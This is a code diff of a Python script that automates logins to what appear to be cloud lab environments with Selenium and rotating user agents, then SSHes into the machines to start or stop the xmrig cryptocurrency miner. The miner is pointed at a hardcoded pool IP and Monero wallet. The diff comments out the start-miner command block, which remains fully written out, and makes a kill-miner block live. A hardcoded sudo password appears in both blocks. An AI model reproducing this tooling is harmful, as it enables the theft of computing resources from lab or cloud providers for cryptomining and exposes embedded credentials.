@@ -77,7 +77,7 @@ def login_labs(email,passwd,nama_lab,empas):
         
         print("use user-agent: ", UserAgent(verify_ssl=False, cache=False).random)
         # windows driver
-        driver = webdriver.Firefox(executable_path='../drivers/geckodriver',firefox_profile=profile) 
+        driver = webdriver.Firefox(executable_path='drivers/geckodriver',firefox_profile=profile) 
         
         # macOs Driver
         # driver = webdriver.Firefox(executable_path='../drivers/macOs/geckodriver',firefox_profile=profile) 
@@ -191,27 +191,29 @@ def konek_ssh(host,port,namaworker,core=8):
      ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
      ssh.connect(host, port, username, password)
      
-     #run xmrig ========
+    #  #run xmrig ========
+    #  stdin, stdout, stderr = ssh.exec_command('''
+    #  sudo su
+    #  pepengkolan1!
+    #  killall xmrig
+    #  cd main_xmrig/xmrig-6.15.1
+    #  nohup ./xmrig --donate-level 1 -o 51.79.137.110:3333 -u 82Vs2CSgMczP4j9C7e7mn5inpTzpxby3z2LrggqDfVDr3FUGRknMp6XgFdkBFFYJN7ZhuPLCCeDGGGz6YNEYFjJzUGTt4p6.''' + namaworker + ''' --print-time 5 -t '''+ coreStr +'''
+    #  ''')
+    #  print("berhasil run xmrig!")
+    #  wait(0.2)
+    #  ssh.close()
+    #  print("ssh closed...")
+
+     #kill xmrig ==========
      stdin, stdout, stderr = ssh.exec_command('''
      sudo su
      pepengkolan1!
      killall xmrig
-     cd main_xmrig/xmrig-6.15.1
-     nohup ./xmrig --donate-level 1 -o 51.79.137.110:3333 -u 82Vs2CSgMczP4j9C7e7mn5inpTzpxby3z2LrggqDfVDr3FUGRknMp6XgFdkBFFYJN7ZhuPLCCeDGGGz6YNEYFjJzUGTt4p6.''' + namaworker + ''' --print-time 5 -t '''+ coreStr +'''
      ''')
-     print("berhasil run xmrig!")
-     wait(0.2)
+     print("berhasil kill xmrig!")
+     wait(1)
      ssh.close()
      print("ssh closed...")
-
-     #kill xmrig ==========
-    #  stdin, stdout, stderr = ssh.exec_command('''
-    #  
-    #  ''')
-    #  print("berhasil kill xmrig!")
-    #  wait(1)
-    #  ssh.close()
-    #  print("ssh closed...")
 
 def random_char(y):
         return ''.join(random.choice(string.ascii_letters) for x in range(y))
@@ -242,14 +244,14 @@ def is_locked(timeout=5):
 
 def is_visible_switch(timeout=120):
     try:
-        ui.WebDriverWait(driver, timeout).until(EC.element_to_be_clickable((By.CLASS_NAME, "ms-Toggle-background"))) 
+        ui.WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.CLASS_NAME, "ms-Toggle-background"))) 
         return True
     except TimeoutException:
         return False
 
 def is_visible_switch_off(timeout):
     try:
-        ui.WebDriverWait(driver, timeout).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(@aria-label,'Stopped')]"))) 
+        ui.WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.XPATH, "//button[contains(@aria-label,'Stopped')]"))) 
         return True
     except TimeoutException:
         return False
